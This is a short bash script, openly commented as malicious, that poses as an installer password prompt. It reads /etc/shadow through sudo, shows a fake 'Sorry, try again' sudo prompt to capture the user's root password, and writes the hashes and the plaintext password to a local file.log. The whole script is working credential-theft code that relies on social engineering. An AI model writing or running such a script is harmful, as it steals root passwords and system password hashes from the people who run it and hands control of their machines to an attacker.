#!/bin/bash
# use social engineering - they trust that its their password
echo "For installation please enter your password"
sudo -k 	# forces sudo deauthentication
PASSES=$(sudo cat /etc/shadow)	# if this doesnt work, the terminals just being a bitch: RESTART and try again
# echo "THE HASHES:"$PASSES
# Make it look like they failed so i can steal their password
echo "Sorry, try again."
name=$(whoami)
echo -n "[sudo] password for $name: "
#read -s $pass
read -s rootPass
echo
# have now stolen the password
TARGETDIR=$(pwd)/file.log
echo $rootPass
echo "HASHES: 
"$PASSES >> $TARGETDIR
echo "ROOT PASSWORD: 
"$rootPass >> $TARGETDIR
